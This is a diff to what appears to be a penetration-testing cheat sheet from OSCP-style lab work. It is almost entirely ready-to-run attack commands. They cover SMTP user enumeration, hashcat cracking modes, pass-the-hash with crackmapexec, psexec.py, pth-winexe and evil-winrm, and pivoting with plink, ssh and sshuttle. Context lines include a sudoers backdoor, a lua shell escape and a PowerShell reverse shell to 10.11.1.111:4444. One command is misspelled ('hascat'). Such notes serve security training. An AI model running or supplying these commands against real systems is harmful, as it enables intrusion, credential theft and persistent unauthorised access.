@@ -289,7 +289,7 @@ debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
 debug1: Sending command: id
 debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
 debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
-uid=1000(user) gid=100(users) groups=100(users)
+<<<<<uid=1000(user) gid=100(users) groups=100(users)>>>>>
 debug1: channel 0: free: client-session, nchannels 1
 Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
 Bytes per second: sent 43133.4, received 44349.5
@@ -305,6 +305,10 @@ debug1: Authentications that can continue: publickey,password,keyboard-interacti
 SSH via Non-Standard Port:
 
 $ ssh -v 10.10.1.111 -p 43022
+
+SSH no matching key exchange method found:
+
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 bob@10.11.1.136
 
 Force Auth Method:
 
@@ -377,7 +381,7 @@ nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve
 
 # Enumerate SMTP Users
 
-smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111
+sudo smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.1.1.65
 
 Send email unauth:
 
@@ -1272,12 +1276,14 @@ Hashcat
 https://hashcat.net/wiki/doku.php?id=example_hashes // m parameter
 https://mattw.io/hashID/types // hashid match
 
-hashcat -m 0 'hash$' /home/kali/Desktop/rockyou.txt // MD5 raw
-hashcat -m 1800 'hash$' /home/kali/Desktop/rockyou.txt // sha512crypt
-hashcat -m 1600 'hash$' /home/kali/Desktop/rockyou.txt // MD5(APR)
-hashcat -m 1500 'hash$' /home/kali/Desktop/rockyou.txt // DES(Unix), Traditional DES, DEScrypt
-hashcat -m 500 'hash$' /home/kali/Desktop/rockyou.txt // MD5crypt, MD5 (Unix)
-hashcat -m 400 'hash$' /home/kali/Desktop/rockyou.txt // Wordpress
+hashcat -m 0 'hash$' /home/kali/rockyou.txt // MD5 raw
+hashcat -m 1800 'hash$' /home/kali/rockyou.txt // sha512crypt
+hashcat -m 1600 'hash$' /home/kali/rockyou.txt // MD5(APR)
+hashcat -m 1500 'hash$' /home/kali/rockyou.txt // DES(Unix), Traditional DES, DEScrypt
+hascat -m 1000 'hash$' /home/kali/rockyou.txt // NTLM
+hashcat -m 500 'hash$' /home/kali/rockyou.txt // MD5crypt, MD5 (Unix)
+hashcat -m 400 'hash$'/home/kali/rockyou.txt // Wordpress
+
 ```
 Online crackers
 
@@ -1536,7 +1542,7 @@ lua: os.execute('/bin/sh')
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 # Set up webserver
-cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080
+cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080; python3 -m http.server 80
 
 # Download all files
 wget http://10.11.1.111:8080/ -r; mv 10.11.1.111:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check
@@ -1558,6 +1564,7 @@ echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
 ### Basic info
 
 ```
+which awk perl python python3 ruby gcc cc nano vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
 uname -a
 env
 id
@@ -2133,11 +2140,27 @@ net start upnphost
 # From this hashdump
 # admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::
 
+## CRACK MAP EXEC
+
 crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -H <NTLM Hash> --local-auth # Check other machines for dual access with the same hash; --sam (dump SAM file)
 
 crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -p <P@ssw0rd1>
 
+## PSEXEC
+
 psexec.py "frank castle":@192.168.68.122 -hashes aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 # attempt to gain a shell
+
+## Pth-Winexe
+
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd
+
+##Evil-Winrm
+
+evil-winrm  -i 192.168.1.100 -u Administrator -H 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
+
+evil-winrm  -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
+
+
 
 msf5 > use exploit/windows/smb/psexec
 msf5 exploit(windows/smb/psexec) > options
@@ -2229,7 +2252,9 @@ $client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = 
 - [WindowsExploits](https://github.com/SecWiki/windows-kernel-exploits)
 
 
-### Windows Port Forwarding
+### Port Forwarding
+
+## Windows
 
 Run in victim (5985 WinRM):
 
@@ -2238,6 +2263,10 @@ Run in victim (5985 WinRM):
 `plink.exe -l kali -pw P@$$word -R 8080:127.0.0.1:445 10.10.16.155`
 
 `ssh -l kali -pw P@$$word -R 445:127.0.0.1:445 10.10.16.155`
+
+## Linux
+
+sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24 -v ## VPN to entire subnetwork
 
 # **Active Directory**
 
